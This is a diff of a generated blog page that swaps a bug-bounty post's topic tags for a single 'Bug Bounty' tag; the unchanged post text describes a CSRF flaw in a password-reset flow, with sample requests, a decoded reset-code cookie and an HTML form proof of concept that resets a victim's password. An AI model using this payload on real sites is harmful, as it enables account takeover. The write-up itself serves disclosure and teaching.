@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
 <title>CSRF on Password Reset Link leading to account takeover. | Blog | Spandan Pokhrel</title>
-<meta name="keywords" content="CSRF, Cross-Site Request Forgery, Password Reset, Account Takeover, Web Security, Web Application Security, Authentication, Security Research">
+<meta name="keywords" content="Bug Bounty">
 <meta name="description" content="Think CSRF on password reset flows is impossible due to reset tokens? Think again. Here is how a misplaced reset code turned a standard reset flow into a full account takeover.">
 <meta name="author" content="Spandan Pokhrel">
 <link rel="canonical" href="http://localhost:1313/posts/bug-bounty/csrf-on-password-reset-link-leading-to-account-takeover/">
@@ -73,12 +73,7 @@
     <meta property="article:section" content="posts">
     <meta property="article:published_time" content="2026-09-03T00:00:00+00:00">
     <meta property="article:modified_time" content="2026-09-03T00:00:00+00:00">
-    <meta property="article:tag" content="CSRF">
-    <meta property="article:tag" content="Cross-Site Request Forgery">
-    <meta property="article:tag" content="Password Reset">
-    <meta property="article:tag" content="Account Takeover">
-    <meta property="article:tag" content="Web Security">
-    <meta property="article:tag" content="Web Application Security">
+    <meta property="article:tag" content="Bug Bounty">
     <meta property="og:image" content="http://localhost:1313/posts/bug-bounty/csrf-on-password-reset-link-leading-to-account-takeover/images/thumbnail.jpg">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://localhost:1313/posts/bug-bounty/csrf-on-password-reset-link-leading-to-account-takeover/images/thumbnail.jpg">
@@ -114,7 +109,7 @@
   "name": "CSRF on Password Reset Link leading to account takeover.",
   "description": "Think CSRF on password reset flows is impossible due to reset tokens? Think again. Here is how a misplaced reset code turned a standard reset flow into a full account takeover.",
   "keywords": [
-    "CSRF", "Cross-Site Request Forgery", "Password Reset", "Account Takeover", "Web Security", "Web Application Security", "Authentication", "Security Research"
+    "Bug Bounty"
   ],
   "articleBody": "Have you ever thought of testing for CSRF vulnerability on a password reset link? You might not have, because we generally believe that it is not possible, as the password reset link itself contains a reset token which acts as an alternative for a CSRF token.\nI, too, once shared this assumption, but recently I encountered a CSRF vulnerability on a password reset link on a popular site. Since the vulnerability is still not patched, let’s refer to it as https://target.com\nGenerally, the password reset link works in 2 different ways:\nThe password reset link is itself https://example.com/reset-password/secretToken \u0026 upon changing the password, a POST request will be sent along with the token that is reflected in the URL. POST /reset-password?secretToken=token HTTP/2 Host: account.example.com password=spandanpokh\u0026password_confirm=spandanpokh The password reset link https://example.com/reset-password/secretToken redirects 302 to https://account.example.com/reset-password?redirect=https%3A%2F%2Faccount.example.com%2Freset-password%2Fsteps\u0026mode=reset-password \u0026 then it allows us to change our password. Here also token will be sent in an HTTP request. POST /reset-password?redirect=https%3A%2F%2Faccount.example.com%2Freset-password%2Fsteps\u0026mode=reset-password HTTP/2 Host: account.example.com secretToken=token\u0026password=%40Helloworld1\u0026password_confirm=%40Helloworld1 Since it is a password reset link, a reset token will definitely be present in the HTTP request and we think that it is impossible to perform CSRF. Well, in my case it was a bit different.\nIn my case as well, the reset link https://target.com/reset-password/79xldx5d0h1gxwxfgw75oobhiff34tmibh9fut9roj5ht was returning 302 and redirecting to https://account.target.com/reset-password?redirect=https%3A%2F%2Faccount.target.com%2Freset-password%2Fsteps\u0026mode=reset-password\nHowever, upon changing the password, I noticed that the reset token was neither reflected on the URL nor on the body of the HTTP request.\nPOST /reset-password?redirect=https%3A%2F%2Faccount.target.com%2Freset-password%2Fsteps\u0026mode=reset-password HTTP/2 Host: account.target.com Cookie: password=%40Helloworld1\u0026password_confirm=%40Helloworld1 Since there was no reset token on the HTTP request, I was thinking how is the server validating the request then? In that HTTP request, there were a lot of encoded cookies, and I immediately started decoding all those cookies.\nNotice the redirect_url parameter on cookies. Decoding the value:\naHR0cHM6Ly9hY2NvdW50LnRhcmdldC5jb20vYXV0aG9yaXplLz9yZXNwb25zZV90eXBlPWNvZGUmYWN0aW9uPXJlc2V0X3Bhc3N3b3JkJmNsaWVudF9pZD1ib3gmc2NvcGU9d2ViJnJlc2V0X2NvZGU9bW56djgwcGV5cHIwcHR2ZWloMnR4cnBpbGpvZTJ6dmhxeHNscTh2OWU0dTIzJmJyb3dzZXJfcGluPVRNVVlOVzlQSVdLVDlQSzRTMFgzMFlUV0c0TE9GOUZXVEk3MFZHUzhSNk9XR0ZEM1hRJnJlZGlyZWN0X3VyaT1odHRwcyUzQSUyRiUyRnRhcmdldC5jb20mZmluaXNoPTE%3D aHR0cHM6Ly9hY2NvdW50LnRhcmdldC5jb20vYXV0aG9yaXplLz9yZXNwb25zZV90eXBlPWNvZGUmYWN0aW9uPXJlc2V0X3Bhc3N3b3JkJmNsaWVudF9pZD1ib3gmc2NvcGU9d2ViJnJlc2V0X2NvZGU9bW56djgwcGV5cHIwcHR2ZWloMnR4cnBpbGpvZTJ6dmhxeHNscTh2OWU0dTIzJmJyb3dzZXJfcGluPVRNVVlOVzlQSVdLVDlQSzRTMFgzMFlUV0c0TE9GOUZXVEk3MFZHUzhSNk9XR0ZEM1hRJnJlZGlyZWN0X3VyaT1odHRwcyUzQSUyRiUyRnRhcmdldC5jb20mZmluaXNoPTE= https://account.target.com/authorize/?response_type=code\u0026action=reset_password\u0026client_id=box\u0026scope=web\u0026reset_code=mnzv80peypr0ptveih2txrpiljoe2zvhqxslq8v9e4u23\u0026browser_pin=TMUYNW9PIWKT9PK4S0X30YTWG4LOF9FWTI70VGS8R6OWGFD3XQ\u0026redirect_uri=https%3A%2F%2Ftarget.com\u0026finish=1 In other words, reset_code is actually being stored on redirect_url cookie \u0026 reset token is being reflected on the HTTP request under the cookie redirect_url.\nNow, here an attacker can easily take over the victim’s account by performing a CSRF attack.\nThe attacker goes to https://account.target.com/reset-password-request and attacker enters the victim’s email. The victim notices that reset link and the victim opens the link. Once the victim opens the link, then the reset_code will be stored on their cookie. Note that victim only opens the link, and ignores it. In other word, victim do not change his/her password.\nThe attacker performs a CSRF attack using this HTML code: \u003chtml\u003e \u003cbody\u003e \u003cscript\u003ehistory.pushState('', '', '/')\u003c/script\u003e \u003cform action=\"https://account.target.com/reset-password?redirect=https%3A%2F%2Faccount.target.com%2Freset-password%2Fsteps\u0026mode=reset-password\" method=\"POST\"\u003e \u003cinput type=\"hidden\" name=\"password\" value=\"YouAreHacked\" /\u003e \u003cinput type=\"hidden\" name=\"password\u0026#95;confirm\" value=\"YouAreHacked\" /\u003e \u003cinput type=\"submit\" value=\"Submit request\" /\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e Once the victim clicks on that password reset link, the reset_code will be saved on their cookies redirect_url. When the victim clicks on that CSRF HTML POC: POST /reset-password?redirect=https%3A%2F%2Faccount.target.com%2Freset-password%2Fsteps\u0026mode=reset-password HTTP/2 Host: account.target.com Cookie: **redirect_url, which contains the reset_code.** password=YouAreHacked\u0026password_confirm=YouAreHacked The victim’s password gets changed via a CSRF attack. Therefore, yes, a CSRF attack is sometimes possible on the password reset link as well. Make sure that you check the password reset functionality \u0026 understand how it is functioning so that you can find some juicy vulnerabilities.\n",
   "wordCount" : "526",
@@ -295,14 +290,7 @@
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/tags/csrf/">CSRF</a></li>
-      <li><a href="http://localhost:1313/tags/cross-site-request-forgery/">Cross-Site Request Forgery</a></li>
-      <li><a href="http://localhost:1313/tags/password-reset/">Password Reset</a></li>
-      <li><a href="http://localhost:1313/tags/account-takeover/">Account Takeover</a></li>
-      <li><a href="http://localhost:1313/tags/web-security/">Web Security</a></li>
-      <li><a href="http://localhost:1313/tags/web-application-security/">Web Application Security</a></li>
-      <li><a href="http://localhost:1313/tags/authentication/">Authentication</a></li>
-      <li><a href="http://localhost:1313/tags/security-research/">Security Research</a></li>
+      <li><a href="http://localhost:1313/tags/bug-bounty/">Bug Bounty</a></li>
     </ul>
 <nav class="paginav">
   <a class="prev" href="http://localhost:1313/posts/filebrowser/cve-2026-34530/">
@@ -319,7 +307,7 @@
 <ul class="share-buttons">
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share CSRF on Password Reset Link leading to account takeover. on x"
-            href="https://x.com/intent/tweet/?text=CSRF%20on%20Password%20Reset%20Link%20leading%20to%20account%20takeover.&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fbug-bounty%2fcsrf-on-password-reset-link-leading-to-account-takeover%2f&amp;hashtags=CSRF%2cCross-SiteRequestForgery%2cPasswordReset%2cAccountTakeover%2cWebSecurity%2cWebApplicationSecurity%2cAuthentication%2cSecurityResearch">
+            href="https://x.com/intent/tweet/?text=CSRF%20on%20Password%20Reset%20Link%20leading%20to%20account%20takeover.&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fbug-bounty%2fcsrf-on-password-reset-link-leading-to-account-takeover%2f&amp;hashtags=BugBounty">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
